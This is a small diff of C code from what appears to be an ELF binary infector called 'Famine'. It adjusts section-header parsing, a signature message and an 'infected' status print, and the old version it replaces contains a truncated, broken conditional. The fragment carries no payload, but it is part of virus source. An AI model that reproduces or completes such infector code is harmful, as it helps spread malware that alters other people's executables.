@@ -7,9 +7,9 @@ u_int64_t	section_getter(char *ptr, size_t size, int fd)
 	u_int16_t	shnum			= ehdr->e_shnum;
 	Elf64_Off	sht_offset		= ehdr->e_shoff;
 	Elf64_Shdr	*shdr = (Elf64_Shdr *) (ptr + sht_offset);
-	char *ajustor = ptr + (shdr + ehdr->e_shstrndx)->sh_offset;
+	char 		*ajustor = ptr + (shdr + ehdr->e_shstrndx)->sh_offset;
 
-	const char	*message = "face a la patate, tout est possible #Famine (jucapik)";
+	char		*message = "face a la patate, tout est possible #Famine (jucapik)";
 
 	for (int i = 0 ; i < shnum ; ++i)
 	{
@@ -30,9 +30,7 @@ int		write_string(char *ptr, size_t size, char *path, int fd)
 	u_int64_t	sectionoff;
 	sectionoff = section_getter(ptr, size, fd);
 
-	if (strstr(ptr,
-
-	printf("infecting %s\n", path);
+	printf(GREEN"infected %s\n"RESET, path);
 
 	return (0);
 }
